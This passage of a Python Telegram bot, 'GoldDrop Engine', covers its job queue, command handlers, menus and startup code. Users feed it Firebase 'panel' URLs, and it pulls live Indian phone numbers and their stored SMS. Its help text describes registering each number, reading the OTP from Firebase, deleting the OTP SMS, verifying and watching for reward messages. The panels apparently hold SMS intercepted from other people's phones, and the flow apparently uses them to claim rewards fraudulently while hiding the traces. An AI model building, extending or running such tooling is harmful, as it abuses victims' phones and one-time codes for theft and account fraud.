            return False, "A job is already running."
        _processing_owners.add(chat_id)
    _job_queue.put((chat_id, job_type, data))
    return True, ""

def job_worker():
    while True:
        item = _job_queue.get()
        if item is None: break
        chat_id, jtype, data = item
        try:
            if jtype == "process_panels":
                _run_user(chat_id)
        except Exception as e:
            log(f"job err: {e}", "red")
        finally:
            with _job_lock: _processing_owners.discard(chat_id)
            _job_queue.task_done()

def _run_user(chat_id):
    uid = str(chat_id)
    total, pending = panel_counts(uid)
    if pending == 0:
        log(f"ℹ️ User {uid}: No pending panels.")
        return
    log(f"📊 Starting run for user {uid} — {pending} pending of {total} panels", "cyan")

    stop = threading.Event()
    _stop_events[chat_id] = stop

    for pid, url in get_pending(uid):
        if stop.is_set():
            log(f"⏹ Run stopped for user {uid}", "yellow")
            break
        log(f"📡 Panel {pid}: {url[:70]}", "blue")

        processed_now = blocked_phones()

        devices = extract_devices(url, processed_now)
        if not devices:
            log(f"❌ Panel {pid}: No online live devices (all dead / already done).", "yellow")
            mark_processed(uid, pid)
            continue

        log(
            f"📊 Panel {pid}: {len(devices)} live device(s) found — "
            f"dead numbers (≤{MIN_FIREBASE_MSGS} msgs) auto-skipped",
            "cyan",
        )
        for d in devices:
            log(f"✅ live +91{d['phone']} — {d['firebase_msgs']} msgs in firebase", "green")

        with ThreadPoolExecutor(max_workers=DEFAULT_WORKERS) as ex:
            futs = {
                ex.submit(process_phone, d["phone"], d["firebase_url"],
                          d["client_id"], chat_id, OTP_TIMEOUT, stop): d["phone"]
                for d in devices
            }
            for fut in as_completed(futs):
                try:
                    res = fut.result()
                    if res and res.get("status") == "otp_timeout":
                        log(f"⏱ OTP timeout: +91{res['phone']}", "yellow")
                except Exception as e:
                    log(f"worker crash: {e}", "red")

        mark_processed(uid, pid)
        log(f"✅ Panel {pid} done.", "green")

    _, _, rewards = stats_summary()
    log(f"🎉 Run finished for user {uid}. Lifetime rewards: {rewards}", "green")

def guard(handler):
    async def wrapper(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id if update.effective_user else None
        _known_users.add(user_id)
        if not is_authorized(user_id):
            if update.message:
                await update.message.reply_text("⛔ Unauthorized.")
            elif update.callback_query:
                await update.callback_query.answer("⛔ Unauthorized.", show_alert=True)
            return
        return await handler(update, ctx)
    return wrapper

# ============================================================================
#  HANDLERS
# ============================================================================
PANELS_PER_PAGE = 5

def main_menu():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🟩 ➕ Add Firebase", callback_data="add_panel"),
            InlineKeyboardButton("🟦 📋 Manage Panels", callback_data="manage_panels_1"),
        ],
        [
            InlineKeyboardButton("🟩 ▶️ Start Engine", callback_data="start_proc"),
            InlineKeyboardButton("🟥 ⏹ Stop Engine", callback_data="stop"),
        ],
        [
            InlineKeyboardButton("🟪 💻 Live Terminal", callback_data="live_status"),
            InlineKeyboardButton("🟨 📊 Success / Rewards", callback_data="success"),
        ],
        [
            InlineKeyboardButton("🟦 📱 Recent Numbers", callback_data="phones"),
            InlineKeyboardButton("🟧 📈 Engine Status", callback_data="status"),
        ],
        [
            InlineKeyboardButton("🟥 🗑 Clear Pending", callback_data="clear_pending_confirm"),
            InlineKeyboardButton("🟨 🆘 Help & Guide", callback_data="help"),
        ],
    ])

def build_panels_view(uid, page=1, filter_type="pending"):
    d = _load_panels()
    user_panels = d.get(str(uid), [])
    if filter_type == "pending":
        filtered = [p for p in user_panels if not p.get("processed")]
        title = "⏳ Pending Firebase Panels"
    else:
        filtered = list(user_panels)
        title = "🌐 All Firebase Panels"

    total_count = len(user_panels)
    pending_count = sum(1 for p in user_panels if not p.get("processed"))
    done_count = total_count - pending_count
    total_items = len(filtered)
    total_pages = max(1, (total_items + PANELS_PER_PAGE - 1) // PANELS_PER_PAGE)

    if page < 1: page = 1
    if page > total_pages: page = total_pages

    start_idx = (page - 1) * PANELS_PER_PAGE
    end_idx = start_idx + PANELS_PER_PAGE
    page_items = filtered[start_idx:end_idx]

    text = (
        f"🟦 <b>{title}</b>\n\n"
        f"📊 <b>Total:</b> {total_count} | <b>Pending:</b> {pending_count} | <b>Done:</b> {done_count}\n"
        f"📄 <b>Page:</b> {page}/{total_pages} (Showing {len(page_items)} of {total_items})\n"
        f"───────────────────────────\n"
    )
    if not page_items:
        text += "<i>No panels found in this view.</i>\n\n"
        text += "💡 <i>Send single link, bulk links, or upload a .txt file to add!</i>"
    else:
        for i, p in enumerate(page_items, start=start_idx + 1):
            status_badge = "⏳ Pending" if not p.get("processed") else "✅ Done"
            short_url = p.get("url", "")
            pid = p.get("id", 0)
            text += f"<b>#{i}</b> {status_badge} [<code>{pid}</code>]\n"
            text += f"🔗 <code>{short_url}</code>\n\n"

    buttons = []
    if page_items:
        del_row = []
        for i, p in enumerate(page_items, start=start_idx + 1):
            pid = p.get("id", 0)
            del_row.append(InlineKeyboardButton(f"🗑 #{i}", callback_data=f"delp_{pid}_{page}_{filter_type}"))
        buttons.append(del_row)

    nav_row = []
    if page > 1:
        nav_row.append(InlineKeyboardButton("◀️ Prev", callback_data=f"pnav_{page-1}_{filter_type}"))
    else:
        nav_row.append(InlineKeyboardButton("⏹ First", callback_data="noop"))

    nav_row.append(InlineKeyboardButton(f"📄 {page}/{total_pages}", callback_data=f"pnav_{page}_{filter_type}"))

    if page < total_pages:
        nav_row.append(InlineKeyboardButton("Next ▶️", callback_data=f"pnav_{page+1}_{filter_type}"))
    else:
        nav_row.append(InlineKeyboardButton("⏹ Last", callback_data="noop"))
    buttons.append(nav_row)

    if filter_type == "pending":
        filter_btn = InlineKeyboardButton("🌐 Switch: View All", callback_data=f"pnav_1_all")
    else:
        filter_btn = InlineKeyboardButton("⏳ Switch: View Pending Only", callback_data=f"pnav_1_pending")
    buttons.append([filter_btn])

    buttons.append([
        InlineKeyboardButton("🟩 ➕ Add Firebase", callback_data="add_panel"),
        InlineKeyboardButton("🟥 🗑 Clear Pending", callback_data="clear_pending_confirm"),
    ])
    buttons.append([
        InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_menu")
    ])
    return text, InlineKeyboardMarkup(buttons)

_live_stream_tasks = {}

def stop_user_stream(user_id: int):
    t = _live_stream_tasks.pop(user_id, None)
    if t and not t.done():
        t.cancel()

async def _run_live_stream(bot, chat_id: int, message_id: int, user_id: int):
    last_rendered_text = ""
    # Auto-refresh and edit message every 1 second (up to 300 cycles / 5 min per session)
    for _ in range(300):
        await asyncio.sleep(1.0)
        current = _live_stream_tasks.get(user_id)
        if current is not asyncio.current_task():
            break
        try:
            text, kb = build_live_status_view(user_id, auto_streaming=True)
            if text == last_rendered_text:
                continue
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=text,
                parse_mode="HTML",
                reply_markup=kb
            )
            last_rendered_text = text
        except asyncio.CancelledError:
            break
        except Exception as e:
            err = str(e).lower()
            if "not modified" in err:
                continue
            if "retry after" in err:
                m = re.search(r"retry after (\d+)", err)
                w = int(m.group(1)) if m else 2
                await asyncio.sleep(w)
                continue
            break
    if _live_stream_tasks.get(user_id) is asyncio.current_task():
        _live_stream_tasks.pop(user_id, None)

def build_live_status_view(uid=None, auto_streaming=True):
    with _terminal_logs_lock:
        recent = list(_terminal_logs)[-18:]
    log_text = "\n".join(recent) if recent else "No terminal activity recorded yet."
    escaped_logs = html.escape(log_text)
    busy = list(_processing_owners)
    status_str = "🟢 Running" if busy else "🟡 Idle"
    stream_str = "🟢 Live (1s)" if auto_streaming else "⏸ Paused"
    queue_size = _job_queue.qsize()
    total, pending = panel_counts(str(uid)) if uid else (0, 0)
    now_str = datetime.now().strftime("%H:%M:%S")

    text = (
        f"🟪 <b>Live Terminal Status</b>\n"
        f"⏱ <b>Time:</b> <code>{now_str}</code> | ⚡ <b>Auto-Refresh:</b> {stream_str}\n"
        f"⚙️ <b>Engine:</b> {status_str} | 📊 <b>Pending Panels:</b> {pending} | <b>Active:</b> {len(busy)}\n"
        f"───────────────────────────\n"
        f"<pre>{escaped_logs}</pre>"
    )
    stream_btn = (
        InlineKeyboardButton("⏹ Pause Auto-Refresh", callback_data="live_stop_stream")
        if auto_streaming else
        InlineKeyboardButton("⚡ Auto-Refresh (1s)", callback_data="live_autostream")
    )
    buttons = [
        [
            InlineKeyboardButton("🔄 Refresh Now", callback_data="live_refresh"),
            stream_btn,
        ],
        [
            InlineKeyboardButton("🟩 ▶️ Start Engine", callback_data="start_proc"),
            InlineKeyboardButton("🟥 ⏹ Stop Engine", callback_data="stop"),
        ],
        [
            InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_menu"),
        ]
    ]
    return text, InlineKeyboardMarkup(buttons)

@guard
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    _active_chat_ids.add(update.effective_chat.id)
    total, pending = panel_counts(str(update.effective_user.id))
    admin_line = ""
    if is_admin(update.effective_user.id):
        admin_line = f"\n👑 <b>Admin mode</b> — {len(ADMIN_IDS)} admin(s)\n"
    await update.message.reply_text(
        f"🎯 <b>GoldDrop Engine</b>\n\n"
        f"Batch: <code>{BATCH_CODE}</code>\n"
        f"Panels: {total} total, {pending} pending{admin_line}\n"
        f"<b>Commands</b>\n"
        f"/addpanel &lt;urls one per line&gt;\n"
        f"/startprocessing\n"
        f"/stop\n"
        f"/successcount\n"
        f"/status\n"
        f"/panels\n"
        f"/phones\n"
        f"/clearpanels\n"
        f"/myid",
        parse_mode="HTML", reply_markup=main_menu(),
    )

@guard
async def cmd_myid(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    await update.message.reply_text(
        f"👤 Your chat ID: <code>{uid}</code>\n"
        f"👑 Admin: {'yes' if is_admin(uid) else 'no'}",
        parse_mode="HTML",
    )

@guard
async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Flow per number:\n"
        "session → register → snapshot Firebase → wait OTP → "
        "<b>safe-delete OTP SMS</b> → verify → notify reward → "
        "<b>watch 5 min for BigCity reward SMS</b>\n\n"
        "<b>Dead-number filter:</b> before processing, we count "
        f"previous SMS in Firebase — if ≤ {MIN_FIREBASE_MSGS} total, "
        "the number is skipped (dead SIM).\n\n"
        "<b>How to use:</b>\n"
        "1️⃣ /addpanel <firebase-url>\n"
        "2️⃣ /startprocessing\n"
        "3️⃣ Watch rewards arrive here!\n",
        parse_mode="HTML",
    )

@guard
async def cmd_addpanel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    text = update.message.text or ""
    parts = re.split(r"/addpanel(?:@\w+)?\s*", text, maxsplit=1)
    if len(parts) < 2 or not parts[1].strip():
        await update.message.reply_text(
            "📥 <b>How to Add Firebase:</b>\n\n"
            "1️⃣ <b>Single Link:</b> Send link directly or <code>/addpanel &lt;url&gt;</code>\n"
            "2️⃣ <b>Bulk Links:</b> Paste multiple links in one message\n"
            "3️⃣ <b>.txt File:</b> Upload any <code>.txt</code> file containing links\n\n"
            "⚡ <i>Smart filter is ON: Any format, subpaths, or base64 will be auto-cleaned!</i>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🟦 📋 Manage Panels", callback_data="manage_panels_1")],
                [InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_menu")]
            ])
        )
        return
    urls = extract_all_firebase_urls(parts[1])
    if not urls:
        await update.message.reply_text("❌ No valid Firebase URLs detected in your text.")
        return
    added = add_panels_bulk(uid, urls)
    total, pending = panel_counts(uid)
    await update.message.reply_text(
        f"✅ <b>Firebase Added!</b>\n\n"
        f"📥 <b>Found:</b> {len(urls)} | <b>New Added:</b> {added}\n"
        f"📊 <b>Total Panels:</b> {total} | <b>Pending:</b> {pending}",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🟦 📋 Manage Panels", callback_data="manage_panels_1")],
            [InlineKeyboardButton("🟩 ▶️ Start Engine", callback_data="start_proc")],
            [InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_menu")]
        ])
    )
@guard
async def cmd_startprocessing(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    _active_chat_ids.add(update.effective_chat.id)
    _, pending = panel_counts(uid)
    if pending == 0:
        await update.message.reply_text("❌ No pending panels. Use /addpanel first.")
        return
    ok, err = enqueue(uid, "process_panels")
    if not ok:
        await update.message.reply_text(f"❌ {err}")
        return
    stop_user_stream(update.effective_user.id)
    text, markup = build_live_status_view(update.effective_user.id, auto_streaming=True)
    msg = await update.message.reply_text(text, parse_mode="HTML", reply_markup=markup)
    t = asyncio.create_task(_run_live_stream(ctx.bot, msg.chat_id, msg.message_id, update.effective_user.id))
    _live_stream_tasks[update.effective_user.id] = t

@guard
async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ev = _stop_events.get(update.effective_user.id)
    if ev:
        ev.set()
        await update.message.reply_text("🛑 Stop signal sent.")
    else:
        await update.message.reply_text("Nothing running.")

@guard
async def cmd_successcount(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    total, succ, rewards = stats_summary()
    await update.message.reply_text(
        f"🎯 <b>Lifetime stats</b>\n"
        f"Success: {succ}\n"
        f"Rewards: {rewards}\n"
        f"Total tracked: {total}",
        parse_mode="HTML")

@guard
async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    total, pending = panel_counts(uid)
    _, succ, rewards = stats_summary()
    busy = list(_processing_owners)
    await update.message.reply_text(
        f"Success: {succ} | Rewards: {rewards}\n"
        f"Panels: {total} (pending {pending})\n"
        f"Queue: {_job_queue.qsize()}\n"
        f"Busy: {len(busy)} — {'🟢 running' if busy else '🟡 idle'}")

@guard
async def cmd_panels(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    text, markup = build_panels_view(uid, page=1, filter_type="pending")
    await update.message.reply_text(text, parse_mode="HTML", reply_markup=markup)
@guard
async def cmd_phones(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    rows = recent_phones(20)
    if not rows:
        await update.message.reply_text("Nothing yet.")
        return
    lines = []
    for phone, status, reward, _ts in rows:
        e = "✅" if status.startswith("success") else "❌"
        r = f" — 🎁 {reward}" if reward else ""
        lines.append(f"{e} <code>{phone}</code> {status}{r}")
    await update.message.reply_text(
        "<b>Recent</b>\n" + "\n".join(lines), parse_mode="HTML")

@guard
async def cmd_clearpanels(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    clear_panels(uid)
    await update.message.reply_text(
        "🗑 <b>Pending panels cleared.</b>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🟦 📋 Manage Panels", callback_data="manage_panels_1")],
            [InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_menu")]
        ])
    )
@guard
async def cmd_users(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Admin only.")
        return
    uid_list = all_user_ids()
    if not uid_list:
        await update.message.reply_text("No users yet.")
        return
    msg = "<b>Users with panels</b>\n"
    for uid in uid_list:
        total, pending = panel_counts(uid)
        msg += f"• <code>{uid}</code> — {total} panels ({pending} pending)\n"
    msg += f"\n<b>Configured admins:</b> {len(ADMIN_IDS)}\n"
    for a in ADMIN_IDS:
        msg += f"• <code>{a}</code>\n"
    await update.message.reply_text(msg, parse_mode="HTML")

@guard
async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Admin only.")
        return
    parts = re.split(r"/broadcast(?:@\w+)?\s*", update.message.text or "", maxsplit=1)
    if len(parts) < 2 or not parts[1].strip():
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    text = parts[1].strip()
    sent = 0
    targets = set(_active_chat_ids) | set(ADMIN_IDS) | {int(u) for u in all_user_ids() if str(u).lstrip("-").isdigit()}
    for cid in targets:
        try:
            _send_sync(cid, f"📢 <b>Broadcast</b>\n\n{text}", parse_mode="HTML")
            sent += 1
        except Exception: pass
    await update.message.reply_text(f"✅ Sent to {sent}/{len(targets)} chats.")

@guard
async def cmd_panelstats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Admin only.")
        return
    data = _load_panels()
    lines = ["<b>Panel stats (all users)</b>"]
    for uid, arr in data.items():
        done = sum(1 for p in arr if p.get("processed"))
        pend = len(arr) - done
        lines.append(f"<code>{uid}</code>: {done} done / {pend} pending")
    await update.message.reply_text("\n".join(lines) or "None", parse_mode="HTML")

@guard
async def cmd_livestatus(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    stop_user_stream(uid)
    text, markup = build_live_status_view(uid, auto_streaming=True)
    msg = await update.message.reply_text(text, parse_mode="HTML", reply_markup=markup)
    t = asyncio.create_task(_run_live_stream(ctx.bot, msg.chat_id, msg.message_id, uid))
    _live_stream_tasks[uid] = t

@guard
async def handle_text_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    text = update.message.text or ""
    if text.startswith("/"): return
    urls = extract_all_firebase_urls(text)
    if urls:
        uid = str(update.effective_user.id)
        added = add_panels_bulk(uid, urls)
        total, pending = panel_counts(uid)
        await update.message.reply_text(
            f"✅ <b>Auto-Filter Detected Firebase URLs!</b>\n\n"
            f"📥 <b>Found:</b> {len(urls)} | <b>New Added:</b> {added}\n"
            f"📊 <b>Total Panels:</b> {total} | <b>Pending:</b> {pending}",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🟦 📋 Manage Panels", callback_data="manage_panels_1")],
                [InlineKeyboardButton("🟩 ▶️ Start Engine", callback_data="start_proc")],
                [InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_menu")]
            ])
        )

@guard
async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc: return
    filename = doc.file_name or "document.txt"
    try:
        tg_file = await ctx.bot.get_file(doc.file_id)
        byte_arr = await tg_file.download_as_bytearray()
        content = byte_arr.decode("utf-8", errors="ignore")
        urls = extract_all_firebase_urls(content)
        if not urls:
            await update.message.reply_text(
                f"❌ <b>File:</b> <code>{filename}</code>\n"
                f"No valid Firebase URLs found in this file.",
                parse_mode="HTML"
            )
            return
        uid = str(update.effective_user.id)
        added = add_panels_bulk(uid, urls)
        total, pending = panel_counts(uid)
        await update.message.reply_text(
            f"✅ <b>.txt File Processed!</b>\n\n"
            f"📁 <b>File:</b> <code>{filename}</code>\n"
            f"📥 <b>URLs Found:</b> {len(urls)} | <b>New Added:</b> {added}\n"
            f"📊 <b>Total Panels:</b> {total} | <b>Pending:</b> {pending}",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🟦 📋 Manage Panels", callback_data="manage_panels_1")],
                [InlineKeyboardButton("🟩 ▶️ Start Engine", callback_data="start_proc")],
                [InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_menu")]
            ])
        )
    except Exception as e:
        log(f"Error reading document: {e}", "red")
        await update.message.reply_text(f"❌ Failed to process file: {e}")

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    d = q.data
    if not d.startswith("live_") and d not in ("start_proc", "stop"):
        stop_user_stream(q.from_user.id)
    if d == "start_proc":
        uid = str(q.from_user.id)
        _active_chat_ids.add(q.message.chat_id)
        _, pending = panel_counts(uid)
        if pending == 0:
            await q.answer("❌ No pending panels to process.", show_alert=True)
            return
        ok, err = enqueue(uid, "process_panels")
        if not ok:
            await q.answer(f"❌ {err}", show_alert=True)
            return
        await q.answer("✅ Engine started! Live terminal streaming...")
        stop_user_stream(q.from_user.id)
        text, kb = build_live_status_view(q.from_user.id, auto_streaming=True)
        try:
            await q.edit_message_text(text, parse_mode="HTML", reply_markup=kb)
        except Exception:
            pass
        t = asyncio.create_task(_run_live_stream(ctx.bot, q.message.chat_id, q.message.message_id, q.from_user.id))
        _live_stream_tasks[q.from_user.id] = t
    elif d == "success":
        _, succ, rewards = stats_summary()
        await q.edit_message_text(
            f"Success: {succ}\nRewards: {rewards}", parse_mode="HTML")
    elif d == "status":
        _, succ, rewards = stats_summary()
        await q.edit_message_text(
            f"Success: {succ}\nRewards: {rewards}\nQueue: {_job_queue.qsize()}")
    elif d == "phones":
        rows = recent_phones(15)
        body = "\n".join(
            f"{'✅' if s.startswith('success') else '❌'} <code>{p}</code>"
            for p, s, _r, _t in rows) or "None"
        await q.edit_message_text(body, parse_mode="HTML")
    elif d == "stop":
        ev = _stop_events.get(q.from_user.id)
        if ev:
            ev.set()
            await q.answer("🛑 Stopping engine...")
        else:
            await q.answer("Nothing running.", show_alert=True)
        text, kb = build_live_status_view(q.from_user.id, auto_streaming=True)
        try:
            await q.edit_message_text(text, parse_mode="HTML", reply_markup=kb)
        except Exception:
            pass
    elif d == "help":
        await cmd_help(update, ctx)
    elif d == "back_to_menu":
        total, pending = panel_counts(str(q.from_user.id))
        admin_line = f"\n👑 <b>Admin mode</b>\n" if is_admin(q.from_user.id) else ""
        await q.edit_message_text(
            f"🎯 <b>GoldDrop Engine Dashboard</b>\n\n"
            f"Batch: <code>{BATCH_CODE}</code>\n"
            f"Panels: {total} total, {pending} pending{admin_line}",
            parse_mode="HTML",
            reply_markup=main_menu()
        )
    elif d == "noop":
        pass
    elif d == "add_panel":
        await q.edit_message_text(
            "📥 <b>Send Firebase Panels Now:</b>\n\n"
            "• <b>Single Link:</b> Just paste any Firebase link or panel link in chat\n"
            "• <b>Bulk Links:</b> Paste multiple links together\n"
            "• <b>.txt File:</b> Attach and send your <code>.txt</code> file\n\n"
            "⚡ <i>Smart filter automatically cleans paths, base64 & parameters!</i>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🟦 📋 Manage Panels", callback_data="manage_panels_1")],
                [InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_menu")]
            ])
        )
    elif d == "manage_panels_1" or d == "panels":
        text, kb = build_panels_view(q.from_user.id, page=1, filter_type="pending")
        await q.edit_message_text(text, parse_mode="HTML", reply_markup=kb)
    elif d.startswith("pnav_"):
        parts = d.split("_")
        page = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 1
        ftype = parts[2] if len(parts) > 2 else "pending"
        text, kb = build_panels_view(q.from_user.id, page=page, filter_type=ftype)
        try:
            await q.edit_message_text(text, parse_mode="HTML", reply_markup=kb)
        except Exception:
            pass
    elif d.startswith("delp_"):
        parts = d.split("_")
        pid = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
        page = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 1
        ftype = parts[3] if len(parts) > 3 else "pending"
        delete_panel(q.from_user.id, pid)
        text, kb = build_panels_view(q.from_user.id, page=page, filter_type=ftype)
        try:
            await q.edit_message_text(text, parse_mode="HTML", reply_markup=kb)
        except Exception:
            pass
    elif d == "clear_pending_confirm":
        await q.edit_message_text(
            "⚠️ <b>Are you sure you want to clear all pending panels?</b>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🟥 Yes, Clear Pending", callback_data="clear_pending_yes")],
                [InlineKeyboardButton("🔙 Cancel", callback_data="manage_panels_1")]
            ])
        )
    elif d == "clear_pending_yes":
        clear_panels(str(q.from_user.id))
        text, kb = build_panels_view(q.from_user.id, page=1, filter_type="pending")
        await q.edit_message_text(text, parse_mode="HTML", reply_markup=kb)
    elif d == "live_status":
        stop_user_stream(q.from_user.id)
        text, kb = build_live_status_view(q.from_user.id, auto_streaming=True)
        await q.edit_message_text(text, parse_mode="HTML", reply_markup=kb)
        t = asyncio.create_task(_run_live_stream(ctx.bot, q.message.chat_id, q.message.message_id, q.from_user.id))
        _live_stream_tasks[q.from_user.id] = t
    elif d == "live_refresh":
        is_streaming = q.from_user.id in _live_stream_tasks and not _live_stream_tasks[q.from_user.id].done()
        text, kb = build_live_status_view(q.from_user.id, auto_streaming=is_streaming)
        try:
            await q.edit_message_text(text, parse_mode="HTML", reply_markup=kb)
            await q.answer("Refreshed!")
        except Exception:
            await q.answer("Already up to date.")
    elif d == "live_autostream":
        stop_user_stream(q.from_user.id)
        await q.answer("⚡ 1s Live Auto-Refresh started!")
        text, kb = build_live_status_view(q.from_user.id, auto_streaming=True)
        try:
            await q.edit_message_text(text, parse_mode="HTML", reply_markup=kb)
        except Exception:
            pass
        t = asyncio.create_task(_run_live_stream(ctx.bot, q.message.chat_id, q.message.message_id, q.from_user.id))
        _live_stream_tasks[q.from_user.id] = t
    elif d == "live_stop_stream":
        stop_user_stream(q.from_user.id)
        await q.answer("⏹ Auto-Refresh paused.")
        text, kb = build_live_status_view(q.from_user.id, auto_streaming=False)
        try:
            await q.edit_message_text(text, parse_mode="HTML", reply_markup=kb)
        except Exception:
            pass

# ============================================================================
#  MAIN
# ============================================================================
def main():
    log("=" * 60, "cyan")
    log("  GoldDrop Engine — Telegram Bot Edition (v3)", "green")
    log(f"  Batch: {BATCH_CODE} | PINCODE: {PINCODE}", "yellow")
    log(f"  DB: {DB_PATH} | Panels: {PANELS_FILE}", "yellow")
    log(f"  BigCity rewards log: {BIGCITY_REWARDS_FILE}", "yellow")
    log(f"  Dead-number cutoff: ≤ {MIN_FIREBASE_MSGS} firebase msgs", "yellow")
    log(f"  Photo: {PHOTO_FILE.resolve()} — exists: {PHOTO_FILE.exists()}", "yellow")
    log(f"  Bot token: {BOT_TOKEN[:10]}…{BOT_TOKEN[-4:] if len(BOT_TOKEN) > 14 else ''}", "yellow")
    if ADMIN_IDS:
        log(f"  Admins (locked bot): {sorted(ADMIN_IDS)}", "green")
    else:
        log("  ⚠ ADMIN_CHAT_ID empty → bot is OPEN to everyone", "red")
    log("=" * 60, "cyan")

    if not PHOTO_FILE.exists():
        log(f"⚠ photo.jpg missing at {PHOTO_FILE.resolve()} — registration will fail.", "red")

    init_db()
    for _ in range(JOB_WORKERS):
        threading.Thread(target=job_worker, daemon=True).start()

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("myid", cmd_myid))
    app.add_handler(CommandHandler("addpanel", cmd_addpanel))
    app.add_handler(CommandHandler("startprocessing", cmd_startprocessing))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("successcount", cmd_successcount))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("panels", cmd_panels))
    app.add_handler(CommandHandler("phones", cmd_phones))
    app.add_handler(CommandHandler("clearpanels", cmd_clearpanels))
    app.add_handler(CommandHandler("users", cmd_users))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(CommandHandler("panelstats", cmd_panelstats))
    app.add_handler(CommandHandler("livestatus", cmd_livestatus))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log("\nstopped", "yellow")